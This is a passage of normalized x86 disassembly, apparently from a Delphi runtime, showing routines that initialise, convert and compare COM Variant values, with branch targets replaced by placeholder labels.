lea eax [ ebp - 0x1c ]
call sub_40ec78
retn
sub_411f90
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4124c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411fc9 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40403c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403fe8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_4080ac
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_40403c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4080ac
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40403c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4094d4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40403c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4094d4
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_40403c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_411ca8
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404270
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_411ce0
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404270
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_4047d8
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048c4
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404270
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_411d18
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404270
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_4080ac
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_40403c
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_4080ac
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_40403c
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_4080ac
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_40403c
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_408198
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_40403c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_408198
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_40403c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_411f90
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_411ddc
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_40403c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4124ce
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_40400c
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_4046e0
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_40400c
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_4046e0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40400c
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_411ea8
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_40403c
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40403c
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e440
test ah 0x40
je r-xdata
mov eax esi
call sub_403fe8
mov edx eax
mov eax ebx
call sub_411f0c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_411ddc
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_40403c
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_411ddc
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_40403c
jmp r-xdata
jmp [ eax * 4 + jump_table_41225d ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4080ac
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_40403c
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_4080ac
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_40403c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4094d4
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_40403c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_4094d4
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_40403c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_411ca8
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404270
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_411ce0
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404270
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404210
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_411d18
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404270
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4080ac
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_40403c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4080ac
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_40403c
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4080ac
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_40403c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_408198
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_40403c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_408198
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_40403c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_411f90
jmp r-xdata
sub_4124d4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41257e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412561
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40e8d4
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4047d8
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412568
lea eax [ ebp - 0x10 ]
call sub_40ec78
retn
sub_41258c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4125e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40efa0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_4126b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4125e9
lea eax [ ebp - 0x10 ]
call sub_40ec78
retn
sub_4125f0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4126a8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_41418c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4126af
lea eax [ ebp - 0x20 ]
call sub_4046c8
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41268b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_4047d8
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ec78
retn
sub_4126b8
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412c0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4126f2 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404814
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_4046c8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_4080ac
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404814
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4080ac
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404814
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4094d4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404814
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4094d4
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404814
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_411ca8
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404704
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_411ce0
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404704
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_4047d8
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048c4
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_411d18
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404704
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_4080ac
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404814
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_4080ac
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404814
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_4080ac
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404814
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_408198
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404814
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_408198
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404814
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4126b8
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_4124d4
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404704
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412c11
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4046e0
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_40400c
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_4046e0
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_40400c
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4046e0
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_40400c
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4046e0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40400c
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_41258c
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404704
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404814
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e440
test ah 0x40
je r-xdata
mov eax esi
call sub_4046c8
mov edx eax
mov eax ebx
call sub_4125f0
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_4124d4
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404704
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_4124d4
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404704
jmp r-xdata
jmp [ eax * 4 + jump_table_412979 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4080ac
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404814
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_4080ac
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404814
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_4094d4
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404814
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4094d4
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404814
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_411ca8
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404704
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_411ce0
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404704
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_411d18
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404704
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4080ac
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404814
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4080ac
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404814
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4080ac
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404814
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_408198
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404814
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_408198
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404814
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4126b8
jmp r-xdata
sub_412c18
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412c82
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40efa0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_4058c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412c89
lea eax [ ebp - 0x10 ]
call sub_40ec78
retn
mov dx 0xd
mov ax 0x101
call sub_40e440
sub_412c90
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_412c18
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4058c0
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4058c0
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_4058a8
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_41418c
test al al
je r-xdata
mov eax esi
call sub_4058a8
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40e440
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40e440
mov eax esi
call sub_4058a8
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403324
test al al
jne r-xdata
sub_412d5c
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_4058a8
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_4058a8
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40e440
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4058c0
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4058c0
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_41418c
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40e440
mov eax esi
call sub_4058a8
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403324
test al al
jne r-xdata
sub_412e08
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40ebfc
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_412e44
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40ebfc
sub_412e64
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40ebfc
sub_412e84
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40ebfc
sub_412ea4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40ebfc
sub_412ec4
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40ebfc
sub_412ee4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40ebfc
sub_412f04
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ebfc
sub_412f30
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40ebfc
sub_412f54
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ebfc
sub_412f80
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ebfc
sub_412fac
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ebfc
sub_412fd8
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40ebfc
sub_41303c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40403c
pop esi
pop ebx
retn
mov eax ebx
call sub_40ebfc
sub_413068
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_4048c4
pop esi
pop ebx
retn
mov eax ebx
call sub_40ebfc
sub_4130a0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4058c0
pop esi
pop ebx
retn
mov eax ebx
call sub_40ebfc
sub_4130cc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4058c0
pop esi
pop ebx
retn
mov eax ebx
call sub_40ebfc
sub_4130f8
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x14
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
jne r-xdata
call sub_40e4dc
mov bx 0x8
jmp r-xdata
sub_41311c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4131df
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x11 ]
call sub_40efa0
cmp [ esi ] 0x101
jne r-xdata
cmp [ ebx ] 0x101
jne r-xdata
lea eax [ ebp - 0x11 ]
call [ rw-data ]
mov edx ebx
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_4139d0
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4131e6
lea eax [ ebp - 0x11 ]
call sub_40ec78
retn
lea eax [ ebp - 0x21 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4131b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x21 ]
call sub_40efa0
lea eax [ ebp - 0x21 ]
call [ rw-data ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_4139d0
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x21 ]
call sub_40ec78
retn
sub_413204
push ebx
push ecx
mov [ esp ] dl
mov bl 0x1
mov edx ecx
sub edx 0xe
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
je r-xdata
call sub_40e530
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
sub edx 0x4
jb r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40e530
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
jmp r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40e530
jmp r-xdata
je r-xdata
call sub_40e4dc
xor eax eax
jmp r-xdata
cmp [ esp ] 0x2
je r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ ecx * 2 + rw-data ]
jmp r-xdata
dec dl
je r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
mov al 0x1
mov al 0x1
cmp [ esp ] 0x2
jne r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_413300
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_41333c
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413364
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
